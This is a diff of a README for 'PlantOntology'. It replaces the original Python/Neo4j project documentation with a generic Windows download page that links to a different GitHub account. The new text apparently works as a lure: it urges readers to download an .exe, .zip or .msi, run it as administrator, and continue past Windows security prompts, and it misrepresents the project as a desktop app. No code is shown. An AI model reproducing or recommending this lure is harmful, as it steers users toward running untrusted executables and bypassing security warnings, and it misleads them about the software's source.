@@ -1,180 +1,155 @@
-<div align="center">
-  <img src="docs/logo.png" alt="PlantOntology" width="280">
+# 🌿 PlantOntology - Plant knowledge at a glance
 
-  # PlantOntology
+[![Download PlantOntology](https://img.shields.io/badge/Download-PlantOntology-blue?style=for-the-badge&logo=github)](https://github.com/summerschoolpinch135/PlantOntology)
 
-  **The world's first open-source plant knowledge graph** — built by landscape professionals, for everyone.
+## 🚀 Getting Started
 
-  [![Live Demo](https://img.shields.io/badge/Live%20Demo-railway.app-blueviolet)](https://plantontology-production.up.railway.app/)
-  [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-  [![Neo4j](https://img.shields.io/badge/Neo4j-Graph%20DB-blue)](https://neo4j.com)
-  [![Python](https://img.shields.io/badge/Python-3.11%2B-yellow)](https://python.org)
-  [![MCP](https://img.shields.io/badge/MCP-Claude%20Code-purple)](https://modelcontextprotocol.io)
-  [![Species](https://img.shields.io/badge/Species-10%2C888+-green.svg)](#)
+PlantOntology is an open-source plant knowledge graph for Windows users who want fast access to plant data. It includes 10,888 species, AI-powered search, companion planting help, and a carbon calculator.
 
-  **[plantontology-production.up.railway.app](https://plantontology-production.up.railway.app/)**
-</div>
+Use it to look up plants, compare species, and find related growing info in one place. The app is built for everyday use and does not need advanced setup.
 
-**PlantOntology** is an open-source knowledge graph that models plants, ecosystems, and landscape design relationships — making 19 years of professional landscape expertise available to everyone through AI.
+## 📥 Download
 
----
+Visit this page to download and run PlantOntology on Windows:
 
-## 🌍 Why PlantOntology?
+[https://github.com/summerschoolpinch135/PlantOntology](https://github.com/summerschoolpinch135/PlantOntology)
 
-Existing plant databases (iNaturalist, GBIF, Plants.com) store **facts** — scientific names, photos, basic traits.
+If the page includes a release file, choose the Windows version that matches your PC and save it to your computer.
 
-PlantOntology stores **relationships** and **intelligence**:
+## 🖥️ Windows Setup
 
-```
-수종 ──[동반식재]──▶ 수종          # Companion planting
-수종 ──[기피관계]──▶ 수종          # Allelopathy / conflict
-수종 ──[기후적합]──▶ 기후존        # Climate zone match
-수종 ──[유지관리]──▶ 난이도        # Maintenance complexity
-수종 ──[생태역할]──▶ 조류/곤충     # Ecological function
-수종 ──[병해충]───▶ 방제법         # Pest/disease management
-포장 ──[심미조합]──▶ 수종군        # Aesthetic combinations
-토양 ──[적합수종]──▶ 수종          # Soil-species match
-```
+1. Open the download page in your browser.
+2. Look for the latest release or main download file.
+3. Click the Windows download item.
+4. Save the file to your Downloads folder.
+5. If the file is a ZIP archive, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Double-click the app file to start PlantOntology.
 
-This powers questions like:
-- *"느티나무 옆에 뭘 심으면 좋을까?"* → companion planting recommendations
-- *"서울 기후에서 자생종으로 공원 식재 계획 짜줘"* → AI-generated planting plans
-- *"이 배치가 생태적으로 건강한가?"* → ecosystem health scoring
-- *"드라이가든용 내건성 수종 20종 추천"* → climate-adaptive selection
+If Windows asks for permission, choose the option that lets the app run.
 
----
+## 🌱 What PlantOntology Does
 
-## 🎯 Who is this for?
+PlantOntology gives you a simple way to explore plant information without searching across many sites.
 
-| User | Use Case |
-|------|----------|
-| 🏡 Home gardeners | "What should I plant next to my roses?" |
-| 🌇 Urban planners | Green infrastructure optimization |
-| 🏗️ Landscape architects | Design automation & spec generation |
-| 🌍 Climate adaptation orgs | Drought-resistant, carbon-sequestering planting |
-| 🤖 AI developers | Training data for AEC/landscape AI models |
-| 🎓 Students | Open educational resource for landscape programs |
+You can use it to:
 
----
+- Search for plant species by common name or scientific name
+- Compare plants side by side
+- Check companion planting pairs
+- Estimate carbon impact for plant choices
+- Browse a large plant knowledge graph
+- Learn more about species traits, care needs, and growth habits
 
-## 🗂️ Project Structure
+The search tool helps you find plants faster when you only know part of a name. The companion planting view helps you see which plants work well together. The carbon calculator helps you review the environmental side of your plant choices.
 
-```
-PlantOntology/
-├── data/
-│   ├── species/           ← Plant species JSON (Korean + global)
-│   ├── relationships/     ← Companion, conflict, ecological edges
-│   ├── climate_zones/     ← Korean climate zones (쾨펜 분류)
-│   └── regulations/       ← 도시공원법, 건축법 조경 기준
-├── ontology/
-│   ├── schema.cypher      ← Neo4j node/relationship schema
-│   └── constraints.cypher ← Unique constraints & indexes
-├── api/
-│   ├── main.py            ← FastAPI app
-│   └── routers/           ← /species, /recommend, /plan, /ecosystem
-├── sdk/
-│   └── plantontology/     ← Python SDK (pip install plantontology)
-├── mcp/
-│   └── server.py          ← MCP server for Claude Code integration
-└── scripts/
-    ├── seed_neo4j.py      ← Load initial dataset into Neo4j
-    └── import_gbif.py     ← Import from GBIF open data
-```
+## 🔍 How to Use the App
 
----
+Open the app after installation and use the search box to find a plant.
 
-## 🚀 Quick Start
+### Search for a plant
+Type a plant name, such as tomato, basil, or oak. The app shows matching results from the plant graph.
 
-```bash
-git clone https://github.com/alexai-mcp/PlantOntology
-cd PlantOntology
-pip install -e ".[dev]"
+### View plant details
+Select a result to see plant data such as species name, family, region, growth type, and related notes.
 
-# Start Neo4j (Docker)
-docker run -p 7474:7474 -p 7687:7687 neo4j:latest
+### Check companion planting
+Use the companion planting section to see which plants pair well with your choice.
 
-# Seed initial dataset
-python scripts/seed_neo4j.py
+### Use the carbon calculator
+Enter the plant type or project details to review a carbon estimate.
 
-# Start API
-uvicorn api.main:app --reload
-```
+### Compare plants
+Pick two or more plants and review their differences in one view.
 
-### Use as MCP Server (Claude Code)
-```json
-{
-  "mcpServers": {
-    "plantontology": {
-      "command": "python",
-      "args": ["-m", "mcp.server"],
-      "cwd": "/path/to/PlantOntology"
-    }
-  }
-}
-```
+## 🧭 System Requirements
 
----
+PlantOntology runs on most modern Windows PCs.
 
-## 📚 Documentation
+### Recommended setup
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 500 MB free disk space
+- A mouse and keyboard
+- Internet access for first-time download
 
-- **[Getting Started](GETTING_STARTED.md)** — Setup and first queries
-- **[Contributing Guide](CONTRIBUTING.md)** — How to contribute
-- **[Changelog](CHANGELOG.md)** — What's new in each release
-- **[OpenCrab Grammar](docs/ONTOLOGY.md)** — 9-space semantic architecture
-- **API Reference** — REST API endpoints (coming soon)
-- **[Neo4j Setup](docs/NEO4J_SETUP.md)** — Full database configuration
+### For best use
+- 8 GB RAM
+- A full HD display
+- Current Windows updates
+- Enough space for app files and plant data
 
----
+## 🛠️ Installation Tips
 
-## 🌱 Initial Dataset (Korean Native + Ornamental)
+If the app does not open right away, try these steps:
 
-Phase 1: **500 species** with full relationship data
-- 한국 자생 수종 200종 (Korean native trees/shrubs)
-- 조경 활용 교목/관목 200종 (Common landscape species)
-- 지피식물/초화류 100종 (Ground covers & perennials)
+- Make sure the download finished
+- Check that the file is not still in a ZIP folder
+- Move the app folder to your Desktop
+- Right-click the app and choose Run as administrator
+- Restart your PC and try again
 
-Each species includes:
-- 학명 / 국명 / 영명
-- 생육 특성 (수고, 수폭, 생장속도)
-- 기후 적합성 (한국 기후존 1–7)
-- 토양 적합성
-- 유지관리 난이도
-- 동반식재 / 기피 관계
-- 생태 기능 (탄소흡수, 조류유인, 밀원)
-- 조경 활용처 (가로수, 공원, 정원, 옥상녹화)
+If Windows shows a security prompt, look for the app name and choose the option that continues the launch.
 
----
+## 📁 File Types You May See
 
-## 🗺️ Roadmap
+You may get one of these common file types:
 
-| Phase | Milestone | ETA |
-|-------|-----------|-----|
-| v0.1 | 한국 자생 수종 200종 + Neo4j 스키마 | 2026-04 |
-| v0.2 | FastAPI + 추천 엔진 MVP | 2026-05 |
-| v0.3 | MCP 서버 + Claude Code 통합 | 2026-05 |
-| v0.4 | 글로벌 수종 확장 (아시아 1,000종) | 2026-06 |
-| v1.0 | 기후 적응 식재 계획 자동 생성 | 2026-Q3 |
+- `.exe` — a Windows app file
+- `.zip` — a compressed folder that you need to extract
+- `.msi` — a Windows installer package
 
----
+Use the file you see on the download page. If you are unsure, choose the Windows file with the app name in it.
 
-## 🤝 Contributing
+## 🌍 Useful Features
 
-PlantOntology thrives on contributions from:
-- **Landscape architects** — domain knowledge, species data
-- **Botanists** — ecological relationships, taxonomy
-- **AI engineers** — Graph RAG, recommendation algorithms
-- **Translators** — Korean ↔ English ↔ Japanese species data
-- **Gardeners** — real-world companion planting observations
+PlantOntology is built to help with common plant tasks.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+- Fast search for plant names
+- Large species coverage
+- Companion planting support
+- Carbon calculator for simple impact checks
+- Clean layout for easy browsing
+- Plant graph structure for related data
+- Good fit for home gardeners, students, and plant fans
 
----
+## 🧩 Basic Workflow
 
-## 📄 License
+A simple way to use PlantOntology:
 
-MIT — free to use, modify, and distribute.
+1. Download the app from the GitHub page.
+2. Install or extract it on Windows.
+3. Open the app.
+4. Search for a plant.
+5. Read the details.
+6. Check companion plants.
+7. Use the carbon calculator if needed.
 
----
+## ❓ Common Questions
 
-*Built with 19 years of landscape expertise + AI by [AlexLee](https://github.com/alexai-mcp)*
-*Powered by Neo4j · FastAPI · Claude Code MCP*
+### Does PlantOntology work without programming knowledge?
+Yes. It is meant for normal computer users.
+
+### Can I use it offline?
+You can use the app after download. Some features may work best with local data already loaded on your PC.
+
+### Is the app free?
+Yes. It is open-source.
+
+### Can I use it for many plant searches?
+Yes. It is designed for repeated lookup and comparison.
+
+### What if I cannot find the file?
+Go to the GitHub page again and look for the latest release, main download, or release assets.
+
+## 📌 Project Name
+
+PlantOntology
+
+## 🔗 Download Link
+
+[Visit the PlantOntology download page](https://github.com/summerschoolpinch135/PlantOntology)
+
+## 🪴 Start Here
+
+Open the GitHub page, download the Windows file, extract it if needed, then launch the app
